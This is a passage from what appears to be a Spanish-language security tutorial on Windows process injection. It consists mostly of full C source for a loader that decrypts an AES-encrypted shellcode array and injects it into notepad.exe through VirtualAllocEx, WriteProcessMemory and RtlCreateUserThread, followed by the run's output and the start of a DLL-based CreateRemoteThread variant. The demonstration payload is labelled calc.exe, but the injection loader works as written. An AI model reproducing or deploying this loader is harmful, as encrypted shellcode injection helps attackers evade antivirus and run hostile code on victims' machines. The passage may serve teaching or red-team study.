class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>


<span class="kt">int</span> <span class="nf">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
	<span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
	<span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
	<span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido</span>
                
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
                
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess: ] %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"Process Found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
                
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot</span>
                
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">Inject</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">CLIENT_ID</span> <span class="n">cid</span><span class="p">;</span>
	<span class="c1">// Inyeccion tipo2 pRtlCreateUserThread</span>
	<span class="n">RtlCreateUserThread_t</span> <span class="n">pRtlCreateUserThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">RtlCreateUserThread_t</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"NTDLL.DLL"</span><span class="p">),</span> <span class="s">"RtlCreateUserThread"</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">// Inyeccion tipo2 pRtlCreateUserThread</span>
	<span class="n">pRtlCreateUserThread</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cid</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>



<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"notepad.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Notepad.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p>Salida de la ejecución:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eexternal_injection_exe_3.exe
[FindProcess: ] System
[FindProcess: ] Registry
[FindProcess: ] smss.exe
[FindProcess: ] csrss.exe
[FindProcess: ] wininit.exe
[FindProcess: ] csrss.exe
[FindProcess: ] winlogon.exe
[FindProcess: ] services.exe
[FindProcess: ] lsass.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] dwm.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] VBoxService.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] Memory Compression
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] spoolsv.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ruby.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] wlms.exe
[FindProcess: ] MsMpEng.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] sppsvc.exe
[FindProcess: ] NisSrv.exe
[FindProcess: ] sihost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] taskhostw.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ctfmon.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] explorer.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ShellExperienceHost.exe
[FindProcess: ] SearchUI.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] svchost.exe
[FindProcess: ] SkypeApp.exe
[FindProcess: ] YourPhone.exe
[FindProcess: ] SkypeBackgroundHost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] SppExtComObj.Exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] smartscreen.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] cmd.exe
[FindProcess: ] conhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SearchIndexer.exe
[FindProcess: ] SecurityHealthSystray.exe
[FindProcess: ] SecurityHealthService.exe
[FindProcess: ] svchost.exe
[FindProcess: ] VBoxTray.exe
[FindProcess: ] WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe
[FindProcess: ] OneDrive.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] ApplicationFrameHost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] WinStore.App.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SystemSettings.exe
[FindProcess: ] SgrmBroker.exe
[FindProcess: ] uhssvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] WmiPrvSE.exe
[FindProcess: ] notepad++.exe
[FindProcess: ] svchost.exe
[FindProcess: ] TrustedInstaller.exe
[FindProcess: ] TiWorker.exe
[FindProcess: ] vctip.exe
[FindProcess: ] notepad.exe
Process Found!
Notepad.exe PID = 7856

</code></pre></div></div>

<p>Evidencia de la inyección:</p>

<p><img src="/assets/images/inyeccion_proceso_externo_3.png" alt="inyección_proceso_externo" /></p>

<h3 id="codigo-fuente-asociado-a-dlls">Codigo fuente asociado a Dlls</h3>

<h4 id="dll-createremotethread">Dll CreateRemoteThread()</h4>

<p>Código asociado al binario:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span 